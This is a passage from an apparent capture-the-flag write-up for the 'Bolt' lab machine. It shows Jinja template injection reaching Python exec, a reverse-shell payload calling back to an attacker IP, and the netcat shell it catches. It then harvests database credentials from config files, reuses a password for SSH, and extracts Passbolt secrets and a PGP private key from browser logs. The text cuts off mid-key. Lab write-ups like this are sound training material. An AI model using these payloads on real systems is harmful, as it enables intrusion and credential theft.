'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'comp lex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': &< ;class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError ': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeT ranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'Runt imeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError' >, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.} 
```

Python's `exec` function is accessible, making it possible to break out of the restricted Jinja templating environment and execute arbitrary Python code. Prove this is so by starting a web server and using the following payload to submit a `GET` request to it from the target. This results in a hit on the web server.

```http
POST /admin/profile HTTP/1.1
Host: demo.bolt.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Origin: http://demo.bolt.htb
Connection: close
Referer: http://demo.bolt.htb/admin/profile
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGdpaGYifQ.YhGxhg.nGIdWDqOXKhElT2MPL0xQQbF0g0
Upgrade-Insecure-Requests: 1

name={{+get_flashed_messages.__globals__.__builtins__.exec("import+requests;requests.get('http://10.10.14.109/blah')")+}}&experience=experYENCE&skills=skillz	
```

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.161.182 - - [19/Feb/2022 23:41:10] code 404, message File not found
10.129.161.182 - - [19/Feb/2022 23:41:10] "GET /blah HTTP/1.1" 404 -
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Inject the following command, URL encoded, to initiate the reverse shell.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.109",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```http
POST /admin/profile HTTP/1.1
Host: demo.bolt.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 339
Origin: http://demo.bolt.htb
Connection: close
Referer: http://demo.bolt.htb/admin/profile
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGdpaGYifQ.YhGxhg.nGIdWDqOXKhElT2MPL0xQQbF0g0
Upgrade-Insecure-Requests: 1

name={{+get_flashed_messages.__globals__.__builtins__.exec('import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.109%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);')+}}&experience=experYENCE&skills=skillz	
```

Receive the shell as `www-data`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.161.182] 56384
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## MySQL Credentials & Password Reuse

The shell as `www-data` begins in the `/var/www/demo/` directory. `/var/www/demo/config.py` contains the MySQL credential `bolt_dba`:`dXUUHSW9vBpH5qRB`.

```python
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```

`/var/www/roundcube/config/config.inc.php` contains the MySQL credential `roundcubeuser`:`WXg5He2wHt4QYHuyGET`.

```php
/* Local configuration for Roundcube Webmail */

// ----------------------------------
// SQL DATABASE
// ----------------------------------
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// Note: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
// Note: Various drivers support various additional arguments for connection,
//       for Mysql: key, cipher, cert, capath, ca, verify_server_cert,
//       for Postgres: application_name, sslmode, sslcert, sslkey, sslrootcert, sslcrl, sslcompression, service.
//       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
// $config['enable_installer'] = true;
// Log sent messages to <log_dir>/sendmail.log or to syslog
$config['smtp_log'] = false;
```

`/etc/passbolt/passbolt.php` contains the MySQL credential `passbolt`:`rT2;jW7<eY8!dX8}pQ8%`.

```php
<?php
/**
 * Passbolt ~ Open source password manager for teams
 * Copyright (c) Passbolt SA (https://www.passbolt.com)
 *
 * Licensed under GNU Affero General Public License version 3 of the or any later version.
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Passbolt SA (https://www.passbolt.com)
 * @license       https://opensource.org/licenses/AGPL-3.0 AGPL License
 * @link          https://www.passbolt.com Passbolt(tm)
 * @since         2.0.0
 */
/**
 * PASSBOLT CONFIGURATION FILE
 *
 * This is a generated configuration file, which was generated by the passbolt web installer.
 *
 * To see all available options, you can refer to the default.php file, or replace this file
 * by a copy of passbolt.default.php
 * Do not modify default.php or you may break your upgrade process.
 *
 * Read more about how to install passbolt: https://www.passbolt.com/help/tech/install
 * Any issue, check out our FAQ: https://www.passbolt.com/faq
 * An installation issue? Ask for help to the community: https://community.passbolt.com/
 */
return [
    'App' => [
        // A base URL to use for absolute links.
        // The url where the passbolt instance will be reachable to your end users.
        // This information is need to render images in emails for example
        'fullBaseUrl' => 'https://passbolt.bolt.htb',
    ],

    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],

    // Email configuration.
    'EmailTransport' => [
        'default' => [
            'host' => 'localhost',
            'port' => 587,
            'username' => null,
            'password' => null,
            // Is this a secure connection? true if yes, null if no.
            'tls' => true,
            //'timeout' => 30,
            //'client' => null,
            //'url' => null,
        ],
    ],
    'Email' => [
        'default' => [
            // Defines the default name and email of the sender of the emails.
            'from' => ['localhost@bolt.htb' => 'localhost'],
            //'charset' => 'utf-8',
            //'headerCharset' => 'utf-8',
        ],
    ],
    'passbolt' => [
        // GPG Configuration.
        // The keyring must to be owned and accessible by the webserver user.
        // Example: www-data user on Debian
        'gpg' => [
            // Main server key.
            'serverKey' => [
                // Server private key fingerprint.
                'fingerprint' => '59860A269E803FA094416753AB8E2EFB56A16C84',
                'public' => CONFIG . DS . 'gpg' . DS . 'serverkey.asc',
                'private' => CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',
            ],
        ],
        'registration' => [
            'public' => false,
        ],
        'ssl' => [
            'force' => true,
        ]
    ],
];
```

The former password is also `eddie`'s. Grab the user flag from `/home/eddie/user.txt`.

```bash
$ ssh eddie@bolt.htb
eddie@bolt.htb's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

182 updates can be applied immediately.
105 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
You have mail.
Last login: Wed Jan 26 09:54:31 2022 from 10.10.14.23
eddie@bolt:~$ id
uid=1000(eddie) gid=1000(eddie) groups=1000(eddie)
eddie@bolt:~$ ls -la user.txt
-r-------- 1 eddie eddie 33 Feb 19 10:20 user.txt
```

---

## Recovering `root`'s Password from Passbolt

Using the MySQL credential `passbolt`:`rT2;jW7<eY8!dX8}pQ8%`, it is possible to access the `passboltdb` database. These tables are leveraged by [Passbolt's API](https://help.passbolt.com/api).

The [users table](https://help.passbolt.com/api/users) only contains two users, `eddie@bolt.htb` and `clark@bolt.htb`.

```sql
mysql> select * from users;
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| id                                   | role_id                              | username       | active | deleted | created             | modified            |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |
| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

According to the [documentation on PassBolt Resource entities](https://help.passbolt.com/api/resources), "passwords are split into two different entities: Resources and Secrets. The Resource entity is an object which represents a password's metadata and contains items such as searchable password name, the associated username, the URL where the password is used, in addition to other fields." There is only one Resource object in the database. There is no description or URI, but its associated username is `root`, indicating that it could very well be the password to the `root` account.

```sql
mysql> select * from resources;
+--------------------------------------+-------------------+----------+------+-------------+---------+---------------------+---------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| id                                   | name              | username | uri  | description | deleted | created             | modified            | created_by                           | modified_by                          | resource_type_id                     |
+--------------------------------------+-------------------+----------+------+-------------+---------+---------------------+---------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| cd0270db-c83f-4f44-b7ac-76609b397746 | passbolt.bolt.htb | root     |      |             |       0 | 2021-02-25 21:50:11 | 2021-03-06 15:34:36 | 4e184ee6-e436-47fb-91c9-dccb57f250bc | 4e184ee6-e436-47fb-91c9-dccb57f250bc | a28a04cd-6f53-518a-967c-9963bf9cec51 |
+--------------------------------------+-------------------+----------+------+-------------+---------+---------------------+---------------------+--------------------------------------+--------------------------------------+--------------------------------------+
1 row in set (0.00 sec)
```

According to the [documentation on PassBolt Resource entities](https://help.passbolt.com/api/resources), "the Secret entity is the actual password and optionally other secret information such as the encrypted description."

According to the [documentation on PassBolt Secret entities](https://help.passbolt.com/api/secrets), "the returned secret is encrypted using the public key of the user making the request. To retrieve the plaintext password, you must decrypt it using the associated secret key." The `user_id` attribute of the Secret object is "the user whose public key was used to encrypt the plaintext password."

There is only one Secret object in the database and its `user_id` is `4e184ee6-e436-47fb-91c9-dccb57f250bc`, the same as `eddie@bolt.htb`'s `id`. This indicates that `eddie`'s private key can be used to decrypt the body of the Secret object. The Secret object's `resource_id` is `cd0270db-c83f-4f44-b7ac-76609b397746`, which is the same as the `id` of the Resource object representing `root`'s password, indicating that the Secret object is likely `root`'s password.

```sql
mysql> select * from secrets;
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+
| id                                   | user_id                              | resource_id                          | data                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | created             | modified            |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+
| 643a8b12-c42c-4507-8646-2f8712af88f8 | 4e184ee6-e436-47fb-91c9-dccb57f250bc | cd0270db-c83f-4f44-b7ac-76609b397746 | -----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
 | 2021-02-25 21:50:11 | 2021-03-06 15:34:36 |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+
1 row in set (0.00 sec)
```

If `eddie`'s private key can be found, it can be used to decrypt this Secret object, revealing `root`'s password and enabling an elevation of privilege.

It appears `eddie` interacted with the PassBolt server through the [PassBolt browser](https://github.com/passbolt/passbolt_browser_extension) extension. His Chrome history:

```sql
sqlite> select * from urls;
1|https://passbolt.bolt.htb/setup/install/4e184ee6-e436-47fb-91c9-dccb57f250bc/8c7d2952-1598-420d-a666-fdece8f02bfc|Passbolt | Open source password manager for teams|3|1|13258763636927520|0
2|https://chrome.google.com/webstore/detail/passbolt-extension/didegimhafipceonhjepacocaffmoppf|Passbolt Extension - Chrome Web Store|1|0|13258763342878955|0
3|https://chrome.google.com/webstore/detail/passbolt-extension/didegimhafipceonhjepacocaffmoppf/related|Passbolt Extension - Chrome Web Store|1|0|13258763349612874|0
4|https://passbolt.bolt.htb/|Passbolt | Open source password manager for teams|12|1|13258765919103113|0
5|https://passbolt.bolt.htb/app/passwords|Passbolt | Open source password manager for teams|9|0|13258765942598822|0
6|chrome-extension://didegimhafipceonhjepacocaffmoppf/app/passwords|Passbolt | Open source password manager for teams|10|0|13258765943847504|1
7|chrome-extension://didegimhafipceonhjepacocaffmoppf/app/passwords/view/cd0270db-c83f-4f44-b7ac-76609b397746|Passbolt | Open source password manager for teams|2|0|13258765943847504|1
8|https://passbolt.bolt.htb/app/passwords/view/cd0270db-c83f-4f44-b7ac-76609b397746|Passbolt | Open source password manager for teams|2|0|13258765943911714|0
9|chrome-extension://didegimhafipceonhjepacocaffmoppf/app/settings/profile|Passbolt | Open source password manager for teams|3|0|13258765308539555|1
10|https://passbolt.bolt.htb/app/settings/profile|Passbolt | Open source password manager for teams|2|0|13258765305292211|0
11|chrome-extension://didegimhafipceonhjepacocaffmoppf/app/users|Passbolt | Open source password manager for teams|2|0|13258765305238855|1
12|https://passbolt.bolt.htb/app/users|Passbolt | Open source password manager for teams|1|0|13258765303443661|0
13|chrome-extension://didegimhafipceonhjepacocaffmoppf/app/settings/keys|Passbolt | Open source password manager for teams|1|0|13258765308539555|1
14|https://passbolt.bolt.htb/app/settings/keys|Passbolt | Open source password manager for teams|1|0|13258765308569656|0
15|https://passbolt.bolt.htb/auth/logout|Passbolt | Open source password manager for teams|2|0|13258765950628355|0
16|https://passbolt.bolt.htb/auth/login|Passbolt | Open source password manager for teams|2|0|13258765950628355|0
```

It looks like `eddie` used the browser extension to generate and download a private key. The downloads reference `/home/eddie/Downloads/eddie_priv` and `/home/eddie/Downloads/passbolt_private.txt`, neither of which exist anymore.

```sql
sqlite> select * from downloads;
2|e283e94f-9a9b-45fd-b1e5-42f0782da12b|/home/eddie/Downloads/eddie_priv|/home/eddie/Downloads/eddie_priv|13258763361555321|3756|3756|1|0|0||13258763375580079|0|0|0||chrome-extension://didegimhafipceonhjepacocaffmoppf/|chrome-extension://didegimhafipceonhjepacocaffmoppf/index.html|||didegimhafipceonhjepacocaffmoppf|Passbolt Extension|||text/plain|text/plain
3|995e6a62-650e-4e65-97d0-cdc75c427e7d|/home/eddie/Downloads/passbolt_private.txt|/home/eddie/Downloads/passbolt_private.txt|13258765317536593|3756|3756|1|0|0||13258765321114648|0|0|0||chrome-extension://didegimhafipceonhjepacocaffmoppf/|chrome-extension://didegimhafipceonhjepacocaffmoppf/index.html|||didegimhafipceonhjepacocaffmoppf|Passbolt Extension|||text/plain|text/plain
```

Looking through the visited URLs, it appears the Chrome extension ID of the PassBolt extension is `didegimhafipceonhjepacocaffmoppf`. Navigating to the data directory of this extension, (`/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/`), there is a log file named `000003.log` that contains activity from when `eddie` interacted with PassBolt. Several of these logs contain `eddie`'s private key.

```json
{
    "config": {
        "debug": false,
        "log": {
            "console": false,
            "level": 0
        },
        "user.firstname": "Eddie",
        "user.id": "4e184ee6-e436-47fb-91c9-dccb57f250bc",
        "user.lastname": "Johnson",
        "user.settings.securityToken.code": "GOZ",
        "user.settings.securityToken.color": "#607d8b",
        "user.settings.securityToken.textColor": "#ffffff",
        "user.settings.trustedDomain": "https://passbolt.bolt.htb",
        "user.username": "eddie@bolt.htb"
    },
    "passbolt-private-gpgkeys": "{\"MY_KEY_ID\":{\"key\":\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\n1VrD5poP